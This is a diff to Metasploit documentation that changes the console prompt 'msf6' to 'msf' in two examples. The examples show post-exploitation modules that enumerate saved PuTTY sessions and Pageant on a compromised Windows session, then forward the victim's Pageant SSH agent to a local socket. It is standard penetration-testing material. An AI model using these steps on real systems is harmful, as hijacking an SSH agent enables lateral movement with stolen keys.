@@ -31,10 +31,10 @@ Specify a filename for the local UNIX socket. (default path is random)
 Use `windows/gather/enum_putty_saved_sessions` to detect Pageant and known hosts:
 
 ```
-msf6 > use post/windows/gather/enum_putty_saved_sessions
-msf6 post(windows/gather/enum_putty_saved_sessions) > set session 1
+msf > use post/windows/gather/enum_putty_saved_sessions
+msf post(windows/gather/enum_putty_saved_sessions) > set session 1
 session => 1
-msf6 post(windows/gather/enum_putty_saved_sessions) > run
+msf post(windows/gather/enum_putty_saved_sessions) > run
 
 [*] Looking for saved PuTTY sessions
 [*] Found 3 sessions
@@ -87,10 +87,10 @@ Stored SSH host key fingerprints
 Establish a local forward with `post/windows/manage/forward_pageant`:
 
 ```
-msf6 > use post/windows/manage/forward_pageant 
-msf6 post(windows/manage/forward_pageant) > set session 1
+msf > use post/windows/manage/forward_pageant 
+msf post(windows/manage/forward_pageant) > set session 1
 session => 1
-msf6 post(windows/manage/forward_pageant) > run
+msf post(windows/manage/forward_pageant) > run
 
 [*] Launched listening socket on /tmp/bVN4Dg2W
 [*] Set SSH_AUTH_SOCK variable to /tmp/bVN4Dg2W (e.g. export SSH_AUTH_SOCK="/tmp/bVN4Dg2W")
